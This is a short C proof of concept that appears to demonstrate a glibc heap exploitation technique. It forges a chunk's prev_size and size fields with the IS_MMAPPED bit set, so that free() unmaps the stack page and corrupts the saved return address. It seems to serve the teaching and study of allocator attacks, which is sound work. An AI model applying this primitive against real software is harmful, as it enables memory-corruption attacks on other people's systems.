#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

#define IS_MMAPPED 0x2

typedef size_t INTERNAL_SIZE_T;

struct malloc_chunk {
    INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */
    INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */

    struct malloc_chunk* fd;         /* double links -- used only if free. */
    struct malloc_chunk* bk;

    /* Only used for large blocks: pointer to next larger size.  */
    struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
    struct malloc_chunk* bk_nextsize;
};

typedef struct malloc_chunk* mchunkptr;


int main(int argc, const char* argv[], const char* envp[]) {
    size_t stack_var = 0x1;
    
    // Initialize ptmalloc
    malloc(1);

    size_t *mem = malloc(0x20);
    mchunkptr p = (mchunkptr)(mem - 2);
    uintptr_t target = (uintptr_t)&stack_var;
    printf("p: %p, target: %p\n", (void*)p, (void*)target);

    //     uintptr_t block = (uintptr_t) p - p->prev_size;
    // this essentially ends up setting block to target
    p->prev_size = (uintptr_t)p - (target & ~0xfff);

    //     size_t total_size = p->prev_size + size;
    // total_size is required to be page-aligned but can be arbitrarily large
    p->size      = ((uintptr_t)4096 - (uintptr_t)(p->prev_size)) | IS_MMAPPED;

    printf("p->prev_size: %zu, p->size: %zu\n", p->prev_size, p->size);

    // results in the stack page containing stack_var getting unmapped, which 
    // is very likely the page that contains the stack frames of free and co., 
    // making the ret from munmap page-fault. The kernel will map in a zero 
    // page to extend the stack, changing the saved return address to 0.
    free(mem);  
    return 0;
}
